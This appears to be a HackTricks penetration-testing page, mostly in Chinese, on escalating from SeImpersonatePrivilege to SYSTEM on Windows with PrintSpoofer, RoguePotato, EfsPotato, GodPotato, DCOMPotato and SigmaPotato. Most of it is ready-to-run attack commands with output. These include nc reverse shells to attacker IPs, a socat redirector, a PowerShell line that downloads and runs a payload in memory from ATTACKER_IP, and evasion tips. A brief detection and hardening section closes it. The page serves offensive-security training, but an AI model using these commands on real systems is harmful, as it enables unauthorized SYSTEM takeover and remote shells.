# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato 在 Windows Server 2019 及 Windows 10 build 1809 及更高版本上无法使用。** 然而，[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** 可以用来 **获得相同的权限并提升到 `NT AUTHORITY\SYSTEM`** 级别访问。 这篇 [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) 深入介绍了 `PrintSpoofer` 工具，该工具可用于在 JuicyPotato 不再有效的 Windows 10 和 Server 2019 主机上滥用 impersonation privileges。

> [!TIP]
> 一个在 2024–2025 年间持续维护的现代替代方案是 SigmaPotato（GodPotato 的一个分支），它增加了内存/.NET reflection 的使用并扩展了对操作系统的支持。见下方的快速用法以及参考中的仓库。

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## 要求和常见注意事项

下面所有技术都依赖于从持有以下任一特权的上下文滥用一个支持 impersonation 的特权服务：

- SeImpersonatePrivilege（最常见）或 SeAssignPrimaryTokenPrivilege
- 如果令牌已经包含 SeImpersonatePrivilege，则不需要 High integrity（这在许多服务账户，例如 IIS AppPool、MSSQL 等中很常见）

快速检查权限：
```cmd
whoami /priv | findstr /i impersonate
```
操作说明：

- PrintSpoofer 需要 Print Spooler 服务处于运行状态，并且可通过本地 RPC 端点 (spoolss) 访问。在经过加固的环境中，如果 Spooler 在 PrintNightmare 之后被禁用，请优先使用 RoguePotato/GodPotato/DCOMPotato/EfsPotato。
- RoguePotato 需要可通过 TCP/135 访问的 OXID resolver。如果出口被阻断，使用 redirector/port-forwarder（见下方示例）。旧版构建需要 -f 标志。
- EfsPotato/SharpEfsPotato 滥用 MS-EFSR；如果某个 pipe 被阻塞，尝试使用替代 pipe（lsarpc、efsrpc、samr、lsass、netlogon）。
- 在 RpcBindingSetAuthInfo 期间出现错误 0x6d3 通常表示未知或不受支持的 RPC 身份验证服务；尝试使用不同的 pipe/transport 或确保目标服务正在运行。

## 快速演示

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
注意：
- 你可以使用 -i 在当前控制台生成一个交互式进程，或使用 -c 运行一行命令。
- 需要 Spooler 服务。如果被禁用，将会失败。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
如果出站 135 被阻止，请在你的 redirector 上通过 socat pivot OXID resolver：
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
提示：如果一个 pipe 失败或 EDR 阻止它，尝试其他受支持的 pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
说明:
- 适用于 Windows 8/8.1–11 和 Server 2012–2022，当存在 SeImpersonatePrivilege 时。

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato 提供两个变体，针对默认使用 RPC_C_IMP_LEVEL_IMPERSONATE 的服务 DCOM 对象。编译或使用提供的二进制文件并运行你的命令：
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato 添加了现代化的便利功能，例如通过 .NET reflection 实现的内存中执行，以及一个 PowerShell reverse shell 辅助工具。
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## 检测与加固注意事项

- 监控创建命名管道并立即调用令牌复制相关 API，随后使用 CreateProcessAsUser/CreateProcessWithTokenW 的进程。Sysmon 可以揭示有用的遥测信息：Event ID 1（进程创建）、17/18（命名管道创建/连接），以及以 SYSTEM 身份产生子进程的命令行。
- Spooler 加固：在不需要的服务器上禁用 Print Spooler 服务可防止通过 spoolss 的 PrintSpoofer 式本地强制（coercions）。
- 服务账户加固：尽量减少将 SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege 分配给自定义服务。考虑在虚拟账户下以最低必要权限运行服务，并在可能时使用 service SID 和写受限令牌进行隔离。
- 网络控制：阻断出站 TCP/135 或限制 RPC endpoint mapper 流量可以破坏 RoguePotato，除非存在内部重定向器。
- EDR/AV：这些工具大多有广泛的签名。重新从源码编译、重命名符号/字符串或使用内存执行可以降低被检测的可能性，但无法绕过健壮的行为检测。

## 参考资料

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
